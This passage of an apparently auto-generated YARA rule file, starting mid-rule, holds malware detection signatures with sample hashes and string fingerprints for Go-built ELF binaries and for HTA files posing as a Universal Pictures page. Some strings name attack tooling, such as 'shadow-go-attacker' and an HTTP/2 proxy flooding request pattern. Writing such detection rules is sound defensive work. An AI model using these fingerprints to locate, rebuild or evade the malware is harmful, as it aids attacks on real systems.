      hash6 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = "x509: cannot verify signature: algorithm unimplementedx509: invalid RDNSequence: invalid attribute value: %sURI with IP (%q) can" ascii /* score: '54.00'*/
      $s2 = "tp2: client connection force closed via ClientConn.Closetls: server changed cipher suite after a HelloRetryRequestGODEBUG=execwa" ascii /* score: '23.00'*/
      $s3 = "it=2 detected a leaked exec.Cmd created by:" fullword ascii /* score: '20.00'*/
      $s4 = "mpressed len (%d) does not match specified len (%d)mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:to" ascii /* score: '19.00'*/
      $s5 = " stream ID 0frame_continuation_zero_streamaccess-control-request-headerspersistConn was already in LRUprotocol version not suppo" ascii /* score: '18.00'*/
      $s6 = ": server sent an unnecessary HelloRetryRequest messagetls: server selected an invalid PSK and cipher suite pairruntime: checkmar" ascii /* score: '17.00'*/
      $s7 = "ngth constraintx509: failed to load system roots and no roots providedcipher.NewCBCEncrypter: IV length must equal block sizecip" ascii /* score: '15.00'*/
      $s8 = "arger than specified content lengthhttp2: response header list larger than advertised limithttp: Request.RequestURI can't be set" ascii /* score: '13.00'*/
      $s9 = "19985007e34tls: Ed25519 public keys are not supported before TLS 1.2received record with version %x when expecting version %xtls" ascii /* score: '13.00'*/
      $s10 = "her.NewCBCDecrypter: IV length must equal block sizeeach colon-separated field must have at least one digithttp2: request body l" ascii /* score: '12.00'*/
      $s11 = "ks found unexpected unmarked object obj=runtime: netpoll: break fd ready for something unexpectedruntime: failed to disable prof" ascii /* score: '10.00'*/
      $s12 = "ly with Waitcannot run executable found relative to current directory (set GODEBUG=execwait=2 to capture stacks for debugging)ht" ascii /* score: '8.00'*/
      $s13 = "0b7d7bfd8ba270b39432355ffb4b70e0cbd6bb4bf7f321390b94a03c1d356c21122343280d6115c1d21bd376388b5f723fb4c22dfe6cd4375a05a07476444d58" ascii /* score: '8.00'*/
      $s14 = "p gp->status is not in scan statereflect: internal error: invalid use of makeMethodValuex509: too many intermediates for path le" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f27_73 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash3 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash4 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
   strings:
      $x1 = ", locked to threadOpera Software ASAX-Forwarded-ServerX-Akamai-EdgescapeSec-Ch-Ua-Platformshadow-go-attackerinput/output errorno" ascii /* score: '42.00'*/
      $s2 = "LE_SIZEIf-Modified-Sinceframe_ping_lengthtruncated headersif-modified-sincetransfer-encodingx-forwarded-protounencrypted_http2X-" ascii /* score: '24.00'*/
      $s3 = "al-Forwarded-Forproxy dial failed for %s%s?_=%d&r=%d&tid=%d&s=%sfunction not implementedlevel 2 not synchronizedlink number out " ascii /* score: '19.00'*/
      $s4 = "message too longno route to hostremote I/O errorstopped (signal)time: bad [0-9]*Imperial_AramaicMeroitic_CursiveZanabazar_Square" ascii /* score: '15.00'*/
      $s5 = "unpacking headerContent-Languageinvalid encodingempty hex numberlength too large[bisect-match 0xCloseCurlyQuote;ContourIntegral;" ascii /* score: '14.00'*/
      $s6 = "specularconstantspecularexponentxchannelselectorychannelselectorkernelUnitLengthmaskContentUnitspatternTransformrequiredFeatures" ascii /* score: '14.00'*/
      $s7 = "animatetransformfeconvolvematrixanimateTransformfeConvolveMatrixkernelunitlengthmaskcontentunitspatterntransformrequiredfeatures" ascii /* score: '14.00'*/
      $s8 = "sung Electronicshttp2-proxy-browserX-Cluster-Client-IPsync.Cond is copiedbad file descriptortoo many open filesdirectory not emp" ascii /* score: '13.00'*/
      $s9 = "123456789ABCDEFX0123456789abcdefxinvalid stream IDTransfer-EncodingCOMPRESSION_ERRORENHANCE_YOUR_CALMHTTP_1_1_REQUIREDHEADER_TAB" ascii /* score: '11.00'*/
      $s10 = "Idempotency-KeyMoved PermanentlyFailed DependencyToo Many Requestspidfd_send_signal" fullword ascii /* score: '10.00'*/
      $s11 = "mstartm not found in allmstopm holding lockssemaRoot rotateLeftbad notifyList sizeruntime: preempt g0runtime: pcdata is America/" ascii /* score: '9.00'*/
      $s12 = "of rangeout of streams resourcesconnection reset by peerstructure needs cleaningfloating point exceptionfile size limit exceeded" ascii /* score: '9.00'*/
      $s13 = "circlearrowleft;curvearrowright;downharpoonleft;leftharpoondown;leftrightarrows;nLeftrightarrow;nleftrightarrow;ntrianglelefteq;" ascii /* score: '9.00'*/
      $s14 = "EMONIZEDdecryption failedhandshake failureillegal parametermissing extensionunrecognized namereflect.Value.Intin string literal0" ascii /* score: '9.00'*/
      $s15 = " (nil chan)garbage collection scanchan receive (synctest)SIGIO: i/o now possibleSIGSYS: bad system callmakechan: bad alignmentcl" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a_74 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash3 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash4 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $s1 = " sweepgen /cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sync/mutex/wait/total:seconds/godebug/non-default-behavio" ascii /* score: '20.00'*/
      $s2 = " different scopes)failed to get system page sizeassignment to entry in nil mapruntime: found in object at *( in prepareForSweep;" ascii /* score: '20.00'*/
      $s3 = "etected between runtime: impossible type kind unsafe.Slice: len out of rangesync: inconsistent mutex statesync: unlock of unlock" ascii /* score: '18.00'*/
      $s4 = "ed mutexreflect: Elem of invalid type MapIter.Key called before Nextcrypto/rsa: verification errorx509: invalid ECDSA parameters" ascii /* score: '17.00'*/
      $s5 = " after addressasn1: cannot marshal nil valuetransform: short source bufferhttp2: connection error: %v: %vframe_headers_prio_weig" ascii /* score: '13.50'*/
      $s6 = "CLIENT_HANDSHAKE_TRAFFIC_SECRETSERVER_HANDSHAKE_TRAFFIC_SECRETtls: failed to sign handshake: too many PSK Key Exchange modesbad " ascii /* score: '13.00'*/
      $s7 = "untPagesInUse (test)ReadMetricsSlow (test)trace reader (blocked)SIGSTKFLT: stack faultSIGTSTP: keyboard stopsend on closed chann" ascii /* score: '13.00'*/
      $s8 = "iredtoo many transfer encodings: %qnet/http: TLS handshake timeouttls: unsupported public key: %TTLS: sequence number wraparound" ascii /* score: '13.00'*/
      $s9 = "ht_shortPRIORITY frame with stream ID 0Requested Range Not SatisfiableRequest Header Fields Too LargeNetwork Authentication Requ" ascii /* score: '11.00'*/
      $s10 = "ssign requested addressmalformed time zone informationslice bounds out of range [:%x]slice bounds out of range [%x:]SIGSEGV: seg" ascii /* score: '9.50'*/
      $s11 = "rted227373675443232059478759765625inappropriate ioctl for devicesocket operation on non-socketprotocol wrong type for socketSIGU" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427_3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a_75 {
   meta:
      description = "_subset_batch - from files 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash2 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash3 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash4 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
   strings:
      $s1 = "orkprotocol family not supportedoperation already in progressno XENIX semaphores availableTime.UnmarshalBinary: no data454747350" ascii /* score: '18.00'*/
      $s2 = "2: connection error: %v: %vframe_headers_prio_weight_shortPRIORITY frame with stream ID 0too many authentication methodsRequeste" ascii /* score: '16.50'*/
      $s3 = "tcp_fastopenbad certificate status responseencrypted client hello requiredtls: unsupported public key: %TTLS: sequence number wr" ascii /* score: '16.00'*/
      $s4 = "ressmissing validateFirstLine funcmime: duplicate parameter namechunked line ends with bare LFsync: inconsistent mutex statesync" ascii /* score: '11.00'*/
      $s5 = ": unlock of unlocked mutexfips140: verification mismatchsubtle.XORBytes: dst too shortasn1: cannot marshal nil valuetransform: s" ascii /* score: '11.00'*/
      $s6 = "d Range Not SatisfiableRequest Header Fields Too LargeNetwork Authentication Requiredtoo many transfer encodings: %qnet/http: TL" ascii /* score: '11.00'*/
      $s7 = "aparoundCLIENT_HANDSHAKE_TRAFFIC_SECRETSERVER_HANDSHAKE_TRAFFIC_SECRETtls: failed to sign handshake: encoding/hex: invalid byte:" ascii /* score: '10.00'*/
      $s8 = "hort source buffer-//ietf//dtd html 2.0 strict//parsing %q: %d bytes left over/proc/sys/net/ipv4/tcp_tw_reuse/proc/sys/net/ipv4/" ascii /* score: '9.50'*/
      $s9 = " countinappropriate ioctl for devicesocket operation on non-socketprotocol wrong type for socketyear outside of range [0,9999]re" ascii /* score: '9.00'*/
      $s10 = "suerUniqueIDGODEBUG: unknown cpu feature \"crypto/ecdh: mismatched curvesMapIter.Key called before Nexttrailing garbage after ad" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( all of them )
      ) or ( all of them )
}

rule _04bd9e70fac8939e4b0586b95f4596d7e71a6a6286c71c1ff1a88004528edffb_04bd9e70_37ca6849f336f920a33126114d0d9214ca4cbb0dfdd852f60_76 {
   meta:
      description = "_subset_batch - from files 04bd9e70fac8939e4b0586b95f4596d7e71a6a6286c71c1ff1a88004528edffb_04bd9e70.hta, 37ca6849f336f920a33126114d0d9214ca4cbb0dfdd852f601147871e5d58e03_37ca6849.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "04bd9e70fac8939e4b0586b95f4596d7e71a6a6286c71c1ff1a88004528edffb"
      hash2 = "37ca6849f336f920a33126114d0d9214ca4cbb0dfdd852f601147871e5d58e03"
   strings:
      $s1 = "rent and future movies\"><meta name=twitter:image content=/static/favicon.png></head><body><noscript><strong>Please enable JavaS" ascii /* score: '23.00'*/
      $s2 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>Universal<" ascii /* score: '20.00'*/
      $s3 = "=Universal><meta name=description content=\"Universal Pictures | New Movies In Theaters & Upcoming Releases Official website of " ascii /* score: '18.00'*/
      $s4 = "roperty=og:site_name content=Universal><meta property=og:title content=Universal><meta property=og:description content=\"Univers" ascii /* score: '15.00'*/
      $s5 = "niversal Pictures. Watch trailers and get details for current and future movies!\"><meta property=og:type content=website><meta " ascii /* score: '14.00'*/
      $s6 = "or current and future movies\"><meta property=og:url content=/ ><meta property=og:image content=/static/favicon.png><meta proper" ascii /* score: '12.00'*/
      $s7 = "l Pictures | New Movies In Theaters & Upcoming Releases Official website of Universal Pictures. Watch trailers and get details f" ascii /* score: '12.00'*/
      $s8 = "ures | New Movies In Theaters & Upcoming Releases Official website of Universal Pictures. Watch trailers and get details for cur" ascii /* score: '12.00'*/
      $s9 = "e=twitter:card content=summary><meta name=twitter:title content=Universal><meta name=twitter:description content=\"Universal Pic" ascii /* score: '11.00'*/
      $s10 = "ript to continue.</strong></noscript><div id=app></div><script src=/static/js/chunk-vendors.521cba19.js></script><script src=/st" ascii /* score: '10.00'*/
      $s11 = "y=og:image:width content=500><meta property=og:image:height content=500><meta property=og:image:type content=image/png><meta nam" ascii /* score: '9.00'*/
      $s12 = "it=cover\"><link rel=stylesheet href=/static/index.883130ca.css><link rel=icon href=./static/favicon.png><meta name=title conten" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x213c and filesize < 5KB and ( 8 of them )
      ) or ( all of them )
}

